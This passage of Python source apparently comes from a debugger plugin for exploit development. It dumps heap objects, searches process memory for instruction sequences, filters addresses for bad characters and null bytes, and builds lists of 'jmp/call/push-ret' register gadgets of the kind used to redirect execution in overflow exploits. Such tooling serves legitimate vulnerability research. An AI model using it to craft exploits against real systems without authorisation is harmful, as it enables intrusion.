					funcinfo = memloc+offsettxt
		silent = False
		return funcinfo

	def dumpObjectAtLocation(self,size,levels=0,nestedsize=0,customthislog="",customlogfile="", custommsg=""):
		dumpdata = {}
		origdumpdata = {} 
		if __DEBUGGERAPP__ == "WinDBG":
			addy = self.address
			if not silent:
				dbg.log("")
				dbg.log("-" * 70)
				dbg.log("[+] Dumping allocation at %s %s" % (PTR_PRINT % addy, custommsg))
				dbg.log("    Size: 0x%02x bytes" % size)
				if (size > 0x500):
					dbg.log("    Output below will be limited to the first 0x500 bytes")
					size = 0x500
				if levels > 0:
					dbg.log("    Also dumping up to %d levels deep, max size of nested objects: 0x%02x bytes" % (levels, nestedsize))
				dbg.log("")

			parentlist = []
			levelcnt = 0
			if customthislog == "" and customlogfile == "":
				logfile = MnLog("dumpobj.txt")
				thislog = logfile.reset()
			else:
				logfile = customlogfile
				thislog = customthislog
			addys = [addy]
			parent = ""
			parentdata = {}
			while levelcnt <= levels:
				thisleveladdys = []
				for addy in addys:
					cmdtorun = "dps %s L 0x%02x/%x" % ((PTR_PRINT % addy),size,archValue(4,8))
					startaddy = addy
					endaddy = addy + size
					output = dbg.nativeCommand(cmdtorun)
					outputlines = output.split("\n")
					offset = 0
					for outputline in outputlines:
						if not outputline.replace(" ","") == "":
							loc = outputline[0:archValue(8,17)].replace("`","")
							content = outputline[archValue(10,19):archValue(18,36)].replace("`","")
							symbol = outputline[archValue(19,37):]
							if not "??" in content and symbol.replace(" ","") == "":
								contentaddy = hexStrToInt(content)
								info = self.getLocInfo(hexStrToInt(loc),contentaddy,startaddy,endaddy)
								info.append(content)
								dumpdata[hexStrToInt(loc)] = info
							else:
								info = ["",symbol,"",content]
								dumpdata[hexStrToInt(loc)] = info
					if addy in parentdata:
						pdata = parentdata[addy]
						parent = "Referenced at %s (object %s, offset +0x%02x)" % ((PTR_PRINT % pdata[0]),(PTR_PRINT % pdata[1]),pdata[0]-pdata[1])
					else:
						parent = ""
					
					global _heap_cmd_prefix
					if _heap_cmd_prefix is None:
						try:
							_probe = dbg.nativeCommand("!ext.heap")
							if _probe and "Unable to find" not in _probe and "No export" not in _probe:
								_heap_cmd_prefix = "!ext."
							else:
								_heap_cmd_prefix = "!"
						except:
							_heap_cmd_prefix = "!"
					cmd2torun = "%sheap -p -a %s" % (_heap_cmd_prefix, PTR_PRINT % addy)
					output2 = dbg.nativeCommand(cmd2torun)
					heapdata = output2.split("\n")
					
					self.printObjDump(dumpdata,logfile,thislog,size,parent,heapdata)

					for loc in dumpdata:
						thisdata = dumpdata[loc]
						if thisdata[0] == "ptr_obj":
							thisptr = int(thisdata[3],16)
							thisleveladdys.append(thisptr)
							parentdata[thisptr] = [loc,addy]
					if levelcnt == 0:
						origdumpdata = dumpdata
					dumpdata = {}
				addys = thisleveladdys
				size = nestedsize
				levelcnt += 1
		dumpdata = origdumpdata
		return dumpdata


	def printObjDump(self,dumpdata,logfile,thislog,size=0,parent="",heapdata=[]):
		# dictionary, key = address
		# 0 = type
		# 1 = content info
		# 2 = string type
		# 3 = content
		sortedkeys = sorted(dumpdata)
		if len(sortedkeys) > 0:
			startaddy = sortedkeys[0]
			sizem = ""
			parentinfo = ""
			if size > 0:
				sizem = " (0x%02x bytes)" % size
			logfile.write("",thislog)

			if parent == "":
				logfile.write("=" * 60,thislog)

			line = ">> Object at %s%s:" % ((PTR_PRINT % startaddy),sizem)
			if not silent:
				dbg.log("")
				dbg.log(line)
			
			logfile.write(line,thislog)

			if parent != "":
				line = "   %s" % parent
				if not silent:
					dbg.log(line)
				logfile.write(line,thislog)

			line = "Offset  Address      Contents    Info"
			if arch == 64:
				line = "Offset  Address          Contents            Info"
			logfile.write(line,thislog)
			if not silent:
				dbg.log(line)
			line = "------  -------      --------    -----"
			if arch == 64:
				line = "------  -------          --------            -----"
			logfile.write(line,thislog)
			if not silent:
				dbg.log(line)

			offset = 0
			
			for loc in sortedkeys:
				info = dumpdata[loc]
				if len(info) > 1:
					content = ""
					if len(info) > 3:
						content = info[3]
					contentinfo = toAsciiOnly(info[1])
					offsetstr = toSize("%02x" % offset,4)
					line = "+%s   %s | %s  %s" % (offsetstr,(PTR_PRINT % loc),content,contentinfo)
					if not silent:
						dbg.log(line)
					logfile.write(line,thislog)
					offset += archValue(4,8)
			if len(sortedkeys) > 0:
				dbg.log("")
			
			for heapdataline in heapdata:
				logfile.write(heapdataline, thislog)
				dbg.log(heapdataline)
		return

	def getLocInfo(self,loc,addy,startaddy,endaddy):
		locinfo = []
		
		if addy >= startaddy and addy <= endaddy:
			offset = addy - startaddy
			locinfo = ["self","ptr to self+%s" % (PTR_PRINT % offset),""]
			return locinfo

		if addy == 0xc0c0c0c0 or addy == 0xc0c0c0c0c0c0c0c0:
			locinfo = ["self", "Uninitialized", addy]
			return locinfo
			
		ismapped = False

		extra = ""
		ptrx = MnPointer(addy)

		memloc = ptrx.memLocation()
		if not "??" in memloc:
			if "Stack" in memloc:
				extra = "(%s) " % memloc
			elif "Heap" in memloc:
				memloctxt = clickChunkPtr(addy, displaytext = "Heap")
				extra = "(%s) " % memloctxt
			else:
				detailmemloc = ptrx.getPtrFunction()
				extra = " (%s.%s)" % (memloc,detailmemloc)

		# maybe it's a pointer to an object ?
		cmd2run = "dps %s L 1" % (PTR_PRINT % addy)
		output = dbg.nativeCommand(cmd2run)
		outputlines = output.split("\n")
		if len(outputlines) > 0:
			if not "??" in outputlines[0]:
				ismapped = True
				ptraddy = outputlines[0][archValue(10,19):archValue(18,36)].replace("`","")
				ptrinfo = outputlines[0][archValue(19,37):]
				if ptrinfo.replace(" ","") != "":
					if "vftable" in ptrinfo or "Heap" in memloc:
						locinfo = ["ptr_obj","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
					else:
						locinfo = ["ptr","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
					return locinfo

		if ismapped:

			# pointer to a string ?
			try:
				strdata = dbg.readString(addy)
				if len(strdata) > 2:
					datastr = strdata
					if len(strdata) > 80:
						datastr = strdata[0:80] + "..."
					locinfo = ["ptr_str","%sptr to ASCII (0x%02x) '%s'" % (extra,len(strdata),datastr),"ascii"]
					return locinfo
			except:
				pass

			# maybe it's unicode ?
			try:
				strdata = dbg.readWString(addy)
				if len(strdata) > 2:
					datastr = strdata
					if len(strdata) > 80:
						datastr = strdata[0:80] + "..."
					locinfo = ["ptr_str","%sptr to UNICODE (0x%02x) '%s'" % (extra,len(strdata),datastr),"unicode"]
					return locinfo
			except:
				pass

			# maybe the pointer points into a function ?
			ptrf = ptrx.getPtrFunction()
			if not ptrf == "":
				locinfo = ["ptr_func","%sptr to %s" % (extra,ptrf),str(addy)]
				return locinfo


			# BSTR Unicode ?
			try:
				bstr = struct.unpack('<L',dbg.readMemory(addy,4))[0]
				strdata = dbg.readWString(addy+4)
				if len(strdata) > 2 and (bstr == len(strdata)+1):
					datastr = strdata
					if len(strdata) > 80:
						datastr = strdata[0:80] + "..."
					locinfo = ["ptr_str","%sptr to BSTR UNICODE (0x%02x) '%s'" % (extra,bstr,datastr),"unicode"]
					return locinfo
			except:
				pass


			# pointer to a BSTR ASCII?
			try:
				strdata = dbg.readString(addy+4)
				if len(strdata) > 2 and (bstr == len(strdata)/2):
					datastr = strdata
					if len(strdata) > 80:
						datastr = strdata[0:80] + "..."
					locinfo = ["ptr_str","%sptr to BSTR ASCII (0x%02x) '%s'" % (extra,bstr,datastr),"ascii"]
					return locinfo
			except:
				pass



		# pointer itself is a string ?
		
		if ptrx.isUnicode:
			b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
			if arch == 32:
				b1,b2,b3,b4 = splitAddress(addy)
			if arch == 64:
				b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
			ptrstr = toAscii(toHexByte(b2)) + toAscii(toHexByte(b4))
			if arch == 64:
				ptrstr += toAscii(toHexByte(b6)) + toAscii(toHexByte(b8))
			if ptrstr.replace(" ","") != "" and not toHexByte(b2) == "00":
				locinfo = ["str","= UNICODE '%s' %s" % (ptrstr,extra),"unicode"]
				return locinfo

		
		if ptrx.isAsciiPrintable:
			b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
			if arch == 32:
				b1,b2,b3,b4 = splitAddress(addy)
			if arch == 64:
				b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
			ptrstr = toAscii(toHexByte(b1)) + toAscii(toHexByte(b2)) + toAscii(toHexByte(b3)) + toAscii(toHexByte(b4))
			if arch == 64:
				ptrstr += toAscii(toHexByte(b5)) + toAscii(toHexByte(b6)) + toAscii(toHexByte(b7)) + toAscii(toHexByte(b8))
			if ptrstr.replace(" ","") != "" and not toHexByte(b1) == "00" and not toHexByte(b2) == "00" and not toHexByte(b3) == "00" and not toHexByte(b4) == "00":
				if arch != 64 or (not toHexByte(b5) == "00" and not toHexByte(b6) == "00" and not toHexByte(b7) == "00" and not toHexByte(b8) == "00"):
					locinfo = ["str","= ASCII '%s' %s" % (ptrstr,extra),"ascii"]
					return locinfo

		# pointer to heap ?
		if "Heap" in memloc:
			if not "??" in outputlines[0]:
				ismapped = True
				ptraddy = outputlines[0][archValue(10,19):archValue(18,36)]
				locinfo = ["ptr_obj","%sptr to 0%s" % (extra,(PTR_PRINT % hexStrToInt(ptraddy))),str(addy)]
				return locinfo

		# nothing special to report
		return ["","",""]


		
#---------------------------------------#
#  Various functions                    #
#---------------------------------------#
def getDefaultProcessHeap():
	peb = MnPEB.get_address()
	defprocheap = struct.unpack('<L',dbg.readMemory(peb+0x18,4))[0]
	return defprocheap

def getSortedSegmentList(heapbase):
	segments = getSegmentsForHeap(heapbase)
	sortedsegments = []
	for seg in segments:
		sortedsegments.append(seg)
	sortedsegments.sort()
	return sortedsegments

def getSegmentList(heapbase):
	return getSegmentsForHeap(heapbase)


def getSegmentsForHeap(heapbase):
	"""Get segments for a heap, delegating to MnHeap.getHeapSegmentList().

	Return: dict {segaddr: [base, end, firstentry, lastentry]}
	"""
	# Minimal pre-population only: process/thread context + heap list.
	# Segment details are then crawled only for the requested heap below.
	_ensureMnProc(entities=["peb", "teb", "heaps"])
	dbgp(get_current_function_name())
	if heapbase in mnproc.segmentlistCache:
		return mnproc.segmentlistCache[heapbase]
	segmentinfo = {}
	try:
		mHeap = MnHeap(heapbase)
		seglist = mHeap.getHeapSegmentList()
		for segaddr, sinfo in seglist.items():
			segmentinfo[segaddr] = [
				sinfo["base"],
				sinfo["end"],
				sinfo["firstentry"],
				sinfo["lastentry"],
			]
	except Exception as e:
		if DEBUG_MODE:
			dbgp("getSegmentsForHeap(0x%x): EXCEPTION: %s" % (heapbase, str(e)), errormode=False)
			import traceback
			dbgp(traceback.format_exc(), errormode=False)
	dbgp("getSegmentsForHeap(0x%x): returning %d segments" % (heapbase, len(segmentinfo)))
	mnproc.segmentlistCache[heapbase] = segmentinfo
	return segmentinfo



def containsBadChars(address, badchars=b"\x0a\x0d"):
	"""
	checks if the address contains bad chars
	"""

	addrbytes = splitAddress(address)

	# normalize badchars to a set of integer byte values
	if isinstance(badchars, bytes):
		badset = set(badchars) if PY3 else set(ord(b) for b in badchars)
	else:
		badset = set(_ord(b) for b in badchars)

	return any(b in badset for b in addrbytes)


def meetsCriteria(pointer,criteria):
	"""
	checks if an address meets the listed criteria

	Arguments:
	pointer - the MnPointer instance of the address
	criteria - a dictionary with all the criteria to be met

	Return:
	Boolean - True if all the conditions are met
	"""
	#if DEBUG_MODE:
	#	dbgp(get_current_function_name())
	# Unicode
	if "unicode" in criteria and not (pointer.isUnicode or pointer.unicodeTransform != ""):
		return False
		
	if "unicoderev" in criteria and not pointer.isUnicodeRev:
		return False		
		
	# Ascii
	if "ascii" in criteria and not pointer.isAscii:
		return False
	
	# Ascii printable
	if "asciiprint" in criteria and not pointer.isAsciiPrintable:
		return False
	
	# Uppercase
	if "upper" in criteria and not pointer.isUppercase:
		return False
		
	# Lowercase
	if "lower" in criteria and not pointer.isLowercase:
		return False
	
	# Uppercase numeric
	if "uppernum" in criteria and not pointer.isUpperNum:
		return False
	
	# Lowercase numeric
	if "lowernum" in criteria and not pointer.isLowerNum:
		return False	
		
	# Numeric
	if "numeric" in criteria and not pointer.isNumeric:
		return False
	
	# Alpha numeric
	if "alphanum" in criteria and not pointer.isAlphaNumeric:
		return False
		
	# Bad chars
	if "badchars" in criteria and containsBadChars(pointer.getAddress(), criteria["badchars"]):
		return False

	# Nulls
	if "nonull" in criteria and pointer.hasNulls:
		return False
	
	if "startswithnull" in criteria and not pointer.startsWithNull:
		return False
	
	return True

def search(sequences,criteria=[]):
	"""
	Alias for 'searchInRange'
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""	
	dbgp(get_current_function_name())
	return searchInRange(sequences,criteria)
	
	
def searchInRange(sequences, start=0, end=TOP_USERLAND, criteria=[], refresh_pages=True):
	"""
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with
	refresh_pages - if True (default), call dbg.getMemoryPages() before searching.
	               Pass False when the caller has already refreshed the page list
	               (e.g. findSEH calls it once before the per-module loop).

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""
	dbgp(get_current_function_name())
	dbgp("    sequences: %s" % sequences)
	dbgp("    start: %s" % (PTR_PRINT % start))
	dbgp("    end: %s" % (PTR_PRINT % end ))
	dbgp("    criteria: %s" % criteria)
	
	if not "accesslevel" in criteria:
		criteria["accesslevel"] = "*"
	global ptr_counter
	global ptr_to_get
	
	found_opcodes = {}
	fallback_pages = 0
	fallback_pages_with_reads = 0
	fallback_pages_with_hits = 0
	fallback_chunk_reads_total = 0
	fallback_chunk_reads_ok = 0
	fallback_hits_total = 0
	
	if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):

		if not sequences:
			return {}

		# Pre-assemble / normalize patterns once (can be hundreds for `jmp`)
		compiled_patterns = []
		for seq in sequences:
			buf = None
			human_format = b""
			try:
				if isinstance(seq, str):
					human_format = seq.replace("\n"," # ").lower()
					buf = dbg.assemble(seq)
				elif isinstance(seq, (bytes, bytearray)):
					buf = bytes(seq)
					human_format = " ".join(["%02x" % b for b in buf])
				elif isinstance(seq, int):
					buf = bytes([seq & 0xff])
					human_format = "%02x" % (seq & 0xff)
				elif isinstance(seq, (list, tuple)) and len(seq) >= 2:
					human_format = str(seq[0]).replace("\n"," # ")
					buf = seq[1]
				else:
					dbg.log(" ** Unsupported sequence type: %s" % type(seq), highlight=1)
					continue
			except Exception as e:
				dbg.log(" ** Unable to build searchPattern '%s'. **" % str(seq), highlight=1)
				dbg.log(str(e))
				continue

			buf = ensure_bytes(buf) if buf is not None else b""
			# Skip if buf is empty to avoid "ValueError: empty separator"
			if not buf or len(buf) == 0:
				dbg.log(" ** Search pattern '%s' resulted in empty buffer, skipping **" % human_format, highlight=1)
				continue

			compiled_patterns.append((human_format, buf, len(buf)))

		if not compiled_patterns:
			return {}
			
		# check that start is before end
		if start > end:
			start, end = end, start

		dbg.setStatusBar("Searching...")
		if refresh_pages:
			dbg.getMemoryPages()
		had_unreadable_pages = False
		for a in dbg.MemoryPages.keys():

			if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
		
				# get end address of the page
				page_start = a
				page_size = dbg.MemoryPages[a].getSize()
				page_end   = a + page_size
				
				if ( start > page_end or end < page_start ):
					# we are outside the search range, skip
					#if DEBUG_MODE:
					#	dbgp("      - Page is outside of search range, skipping")
					continue
				if (not meetsAccessLevel(dbg.MemoryPages[a],criteria["accesslevel"])):
					#if DEBUG_MODE:
					#	dbgp("      - Page does not have required access level")
					#skip this page, not executable
					continue
					
				# if the criteria check for nulls or unicode, we can skip
				# modules that start with 00
				start_fb = toHex(page_start)[0:2]
				end_fb = toHex(page_end)[0:2]
				if ( ("nonull" in criteria and criteria["nonull"]) and start_fb == "00" and end_fb == "00"  ):
					if not silent:
						dbg.log("      !Skipped search of range %08x-%08x (Has nulls)" % (page_start,page_end))
					continue
				
				if (( ("startswithnull" in criteria and criteria["startswithnull"]))
						and (start_fb != "00" or end_fb != "00")):
					if not silent:
						dbg.log("      !Skipped search of range %08x-%08x (Doesn't start with null)" % (page_start,page_end))
					continue

				dbgp("      -Trying to read page %s-%s" % ((PTR_PRINT % page_start), (PTR_PRINT % page_end)))
				
				mem = dbg.MemoryPages[a].getMemory()

				# If a full region read fails (common when a region contains an unreadable sub-page),
				# fall back to smaller reads and scan those chunks. This prevents skipping the entire
				if not mem:
					had_unreadable_pages = True

					if __DEBUGGERAPP__ == "WinDBG":
						try:
							probe_cmd = "db %s L1" % (PTR_PRINT % page_start)
							probe_output = dbg.nativeCommand(probe_cmd)
						except Exception as e:
							probe_output = ""
							dbgp("      !WinDBG probe failed for %s: %s" % ((PTR_PRINT % page_start), str(e)), errormode=False)

						if "??" in probe_output:
							dbgp("      !WinDBG db probe reports unreadable memory at %s, skipping page fast" %
								 (PTR_PRINT % page_start))
							continue

					dbgp("      !Failed to read full range %s-%s, falling back to chunked reads" %
						 ((PTR_PRINT % page_start), (PTR_PRINT % page_end)))

					chunk_size = 0x1000
					scan_start = max(page_start, start)
					# page_end is exclusive; search end is inclusive
					scan_end_inclusive = min(page_end - 1, end)
					if scan_end_inclusive < scan_start:
						continue

					fallback_pages += 1
					page_fallback_chunk_total = 0
					page_fallback_chunk_ok = 0
					page_fallback_hits = 0

					# carry per pattern to catch matches spanning chunk boundaries
					carries = [b"" for _ in compiled_patterns]

					cursor = scan_start
					while cursor <= scan_end_inclusive:
						if (ptr_to_get > 0 and ptr_counter >= ptr_to_get):
							return found_opcodes

						read_len = min(chunk_size, (scan_end_inclusive - cursor) + 1)
						page_fallback_chunk_total += 1
						fallback_chunk_reads_total += 1
						try:
							chunk = dbg.readMemory(cursor, read_len)
						except Exception:
							chunk = b""

						chunk = ensure_bytes(chunk) if chunk else b""
						# Performance-first fallback: if the first chunk cannot be read,
						# do not continue chunking this page.
						if page_fallback_chunk_total == 1 and len(chunk) == 0:
							dbgp("      !Fallback first chunk read failed at %s for range %s-%s, skipping rest of page" %
								 ((PTR_PRINT % cursor), (PTR_PRINT % page_start), (PTR_PRINT % page_end)))
							break
						if len(chunk) > 0:
							page_fallback_chunk_ok += 1
							fallback_chunk_reads_ok += 1
						if len(chunk) < read_len:
							chunk += b"\x00" * (read_len - len(chunk))
						elif len(chunk) > read_len:
							chunk = chunk[:read_len]

						for pidx, (human_format, buf, buf_len) in enumerate(compiled_patterns):
							if (ptr_to_get > 0 and ptr_counter >= ptr_to_get):
								return found_opcodes

							carry = carries[pidx] if buf_len > 1 else b""
							window = carry + chunk if carry else chunk
							window_base = cursor - (len(carry) if carry else 0)

							start_idx = 0
							while True:
								found_at = window.find(buf, start_idx)
								if found_at == -1:
									break

								# avoid duplicates: if the match is fully inside carry, it was already reported
								if carry and found_at < len(carry) and (found_at + buf_len) <= len(carry):
									start_idx = found_at + 1
									continue

								hit = window_base + found_at
								start_idx = found_at + 1

								if hit < start or hit > end:
									continue

								ptr = MnPointer(hit)
								if not meetsCriteria(ptr, criteria):
									continue

								if human_format in found_opcodes:
									found_opcodes[human_format].append(hit)
								else:
									found_opcodes[human_format] = [hit]
								page_fallback_hits += 1
								fallback_hits_total += 1

								ptr_counter += 1
								if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
									return found_opcodes

							# update carry (last buf_len-1 bytes)
							if buf_len > 1:
								if len(window) >= (buf_len - 1):
									carries[pidx] = window[-(buf_len - 1):]
								else:
									carries[pidx] = window
							else:
								carries[pidx] = b""

						cursor += read_len
					if page_fallback_chunk_ok > 0:
						fallback_pages_with_reads += 1
						dbgp("      [+] Chunked fallback recovered readable bytes for %s-%s. Nice." %
							 ((PTR_PRINT % page_start), (PTR_PRINT % page_end)))
					if page_fallback_hits > 0:
						fallback_pages_with_hits += 1
					dbgp("      !Fallback result for range %s-%s: readable chunks %d/%d, hits=%d" %
						 ((PTR_PRINT % page_start), (PTR_PRINT % page_end), page_fallback_chunk_ok, page_fallback_chunk_total, page_fallback_hits))
					if page_fallback_chunk_ok == 0:
						dbgp("      !Fallback did not recover readable bytes for this range")
					elif page_fallback_hits == 0:
						dbgp("      !Fallback recovered bytes for this range but no matches were found")
					else:
						dbgp("      !Fallback recovered bytes and produced matches for this range")

					continue

				# fast path: full region read succeeded
				for human_format, buf, buf_len in compiled_patterns:
					if (ptr_to_get > 0 and ptr_counter >= ptr_to_get):
						return found_opcodes

					recur_find   = []		
					try:
						mem_list     = mem.split(buf)
						total_length = buf_len * -1
					except Exception as e:
						dbg.log(" ** Unable to process searchPattern '%s'. **" % human_format)
						dbg.log("%s" % str(buf))
						dbg.log(str(e))
						dbg.log("%s" % traceback.format_exc())
						break
					
					for i in mem_list:
						total_length = total_length + len(i) + buf_len
						seq_address = a + total_length
						recur_find.append(seq_address)

					# The last one is the remaining slice from the split, so remove it
					del recur_find[len(recur_find) - 1]

					page_find = []
					for i in recur_find:
						if (i >= start and i <= end):
							ptr = MnPointer(i)

							# check if pointer meets criteria
							if not meetsCriteria(ptr, criteria):
								continue
							
							page_find.append(i)
							
							ptr_counter += 1
							if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
								# stop search
								if human_format in found_opcodes:
									found_opcodes[human_format] += page_find
								else:
									found_opcodes[human_format] = page_find
								return found_opcodes

					# add current pointers to the list and continue
					if len(page_find) > 0:
						if human_format in found_opcodes:
							found_opcodes[human_format] += page_find
						else:
							found_opcodes[human_format] = page_find
		if fallback_pages > 0:
			dbgp("searchInRange fallback summary: pages=%d, readable_pages=%d, pages_with_hits=%d, chunk_reads_ok=%d/%d, hits=%d" %
				 (fallback_pages, fallback_pages_with_reads, fallback_pages_with_hits, fallback_chunk_reads_ok, fallback_chunk_reads_total, fallback_hits_total))
			if fallback_chunk_reads_ok == 0:
				dbgp("searchInRange fallback usefulness: no readable chunks were recovered")
			elif fallback_hits_total == 0:
				dbgp("searchInRange fallback usefulness: recovered bytes but found no matches")
			else:
				dbgp("searchInRange fallback usefulness: recovered bytes and found matches")
		if had_unreadable_pages and not silent:
			dbgp("[!] Some memory ranges could not be read during this search; results may be incomplete.")
	return found_opcodes

# search for byte sequences in a module
def searchInModule(sequences, name, criteria=[], refresh_pages=True):
	"""
	search for byte sequences in a specified module

	Arguments:
	sequences - array of byte sequences to search for
	name - the name of the module to search in
	criteria - Dictionary containing the criteria each pointer should comply with
	refresh_pages - passed through to searchInRange; set False when the caller
	               has already refreshed the page list.

	Return:
	Dictionary (text opcode => array of addresses)
	"""	
	
	module = dbg.getModule(name)
	if(not module):
		dbg.log("Module %s not found" % name)
		return []
	
	# get the base and end address of the module
	start = module.getBaseAddress()
	end   = start + module.getSize()

	return searchInRange(sequences, start, end, criteria, refresh_pages=refresh_pages)

def getRangesOutsideModules():
	"""
	This function will enumerate all memory ranges that are not asssociated with a module
	
	Arguments : none
	
	Returns : array of arrays, each containing a start and end address
	"""	
	ranges=[]
	moduleranges=[]
	#get all ranges associated with modules
	#force full rebuild to get all modules
	populateModuleInfo()
	for thismodule,modproperties in mnproc.g_modules.items():
		top = 0
		base = 0
		for modprop,modval in modproperties.items():
			if modprop == "top":
				top = modval
			if modprop == "base":
				base = modval
		moduleranges.append([base,top])
	#sort them
	moduleranges.sort()
	#get all ranges before, after and in between modules
	startpointer = 0
	endpointer = TOP_USERLAND
	for modbase,modtop in moduleranges:
		endpointer = modbase-1
		ranges.append([startpointer,endpointer])
		startpointer = modtop+1
	ranges.append([startpointer,TOP_USERLAND])
	#return array
	return ranges

def isModuleLoadedInProcess(modulename):
	populateModuleInfo()
	modulefound = False
	module = dbg.getModule(modulename)
	if(not module):
		modulefound = False
	else:
		modulefound = True
	return modulefound
	

def UnicodeTransformInfo(hexaddr):
	"""
	checks if the address can be used as unicode ansi transform
	
	Arguments:
	hexaddr  - a string containing the address in hex format (4 bytes - 8 characters)
	
	Return:
	string with unicode transform info, or empty if address is not unicode transform
	"""
	outstring = ""
	transform=0
	almosttransform=0
	begin = hexaddr[0] + hexaddr[1]
	middle = hexaddr[4] + hexaddr[5]
	twostr=hexaddr[2]+hexaddr[3]
	begintwostr = hexaddr[6]+hexaddr[7]
	threestr=hexaddr[4]+hexaddr[5]+hexaddr[6]
	fourstr=hexaddr[4]+hexaddr[5]+hexaddr[6]+hexaddr[7]
	beginfourstr = hexaddr[0]+hexaddr[1]+hexaddr[2]+hexaddr[3]
	threestr=threestr.upper()
	fourstr=fourstr.upper()
	begintwostr = begintwostr.upper()
	beginfourstr = beginfourstr.upper()
	uniansiconv = [  ["20AC","80"], ["201A","82"],
		["0192","83"], ["201E","84"], ["2026","85"],
		["2020","86"], ["2021","87"], ["02C6","88"],
		["2030","89"], ["0106","8A"], ["2039","8B"],
		["0152","8C"], ["017D","8E"], ["2018","91"],
		["2019","92"], ["201C","93"], ["201D","94"],
		["2022","95"], ["2013","96"], ["2014","97"],
		["02DC","98"], ["2122","99"], ["0161","9A"],
		["203A","9B"], ["0153","9C"], ["017E","9E"],
		["0178","9F"]
		]
	# 4 possible cases :
	# 00xxBBBB
	# 00xxBBBC (close transform)
	# AAAA00xx
	# AAAABBBB
	convbyte=""
	transbyte=""
	ansibytes=""
	#case 1 and 2
	if begin == "00":	
		for ansirec in uniansiconv:
			if ansirec[0]==fourstr:
				convbyte=ansirec[1]
				transbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+twostr+"00"+convbyte+","
		ansistring=""
		for ansirec in uniansiconv:
			if ansirec[0][:3]==threestr:
				if (transform==0) or (transform==1 and ansirec[1] != transbyte):
					convbyte=ansirec[1]
					ansibytes=ansirec[0]
					ansistring=ansistring+"00"+twostr+"00"+convbyte+"->00"+twostr+ansibytes+" / "
					almosttransform=1
		if almosttransform==1:
			if transform==0:
				outstring += "unicode possible ansi transform(s) : " + ansistring
			else:
				outstring +=" / alternatives (close pointers) : " + ansistring
			
	#case 3
	if middle == "00":
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+convbyte+"00"+begintwostr+","
	#case 4
	if begin != "00" and middle != "00":
		convbyte1=""
		convbyte2=""
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte1=ansirec[1]
				transform=1
				break
		if transform == 1:
			for ansirec in uniansiconv:
				if ansirec[0]==fourstr:
					convbyte2=ansirec[1]
					transform=2	
					break						
		if transform==2:
			outstring +="unicode ansi transformed : 00"+convbyte1+"00"+convbyte2+","
	
	# done
	outstring = outstring.rstrip(" / ")
	
	if outstring:
		if not outstring.endswith(","):
			outstring += ","
	return outstring

	
def getSearchSequences(searchtype,searchcriteria="",type="",criteria={}):
	"""
	will build array with search sequences for a given search type
	
	Arguments:
	searchtype = "jmp", "seh"
	
	SearchCriteria (optional): 
		<register> in case of "jmp" : string containing a register
	
	Return:
	array with all searches to perform
	"""
	offsets = [ "", "0x04","0x08","0x0c","0x10","0x12","0x1C","0x20","0x24"]
	archregs = []
	if arch == 32:
		regs = dbglib.Registers32BitsOrder[:]
		archregs = dbglib.Registers32BitsOrder[:]
	if arch == 64:
		regs = dbglib.Registers32BitsOrder[:] + dbglib.Registers64BitsOrder[:]
		archregs = dbglib.Registers64BitsOrder
	search=[]
	
	if searchtype.lower() == "jmp":
		if not searchcriteria: 
			searchcriteria = "esp"
		searchcriteria = searchcriteria.lower()
	
		min = 0
		max = 0
		
		if "mindistance" in criteria:
			min = criteria["mindistance"]
		if "maxdistance" in criteria:
			max = criteria["maxdistance"]
		
		minval = min
		
		while minval <= max:
		
			extraval = ""
			
			if minval != 0:
				operator = ""
				negoperator = "-"
				if minval < 0:
					operator = "-"
					negoperator = ""
				thisval = str(minval).replace("-","")
				thishexval = toHex(int(thisval))
				
				extraval = operator + thishexval
			
			if minval == 0:
				search.append("jmp " + searchcriteria )
				search.append("call " + searchcriteria)
				
				for roffset in offsets:
					search.append("push "+searchcriteria+"\nret "+roffset)
					
				for reg in archregs:
					if reg.lower() != searchcriteria.lower():
						search.append("push " + searchcriteria + "\npop "+reg+"\njmp "+reg)
						search.append("push " + searchcriteria + "\npop "+reg+"\ncall "+reg)			
						search.append("mov "+reg+"," + searchcriteria + "\njmp "+reg)
						search.append("mov "+reg+"," + searchcriteria + "\ncall "+reg)
						search.append("xchg "+reg+","+searchcriteria+"\njmp " + reg)
						search.append("xchg "+reg+","+searchcriteria+"\ncall " + reg)			
						for roffset in offsets:
							search.append("push " + searchcriteria + "\npop "+reg+"\npush "+reg+"\nret "+roffset)			
							search.append("mov "+reg+"," + searchcriteria + "\npush "+reg+"\nret "+roffset)
							search.append("xchg "+reg+","+searchcriteria+"\npush " + reg + "\nret " + roffset)	
			else:
				# offset jumps
				search.append("add " + searchcriteria + "," + operator + thishexval + "\njmp " + searchcriteria)
				search.append("add " + searchcriteria + "," + operator + thishexval + "\ncall " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\njmp " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\ncall " + searchcriteria)
				for roffset in offsets:
					search.append("add " + searchcriteria + "," + operator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
					search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
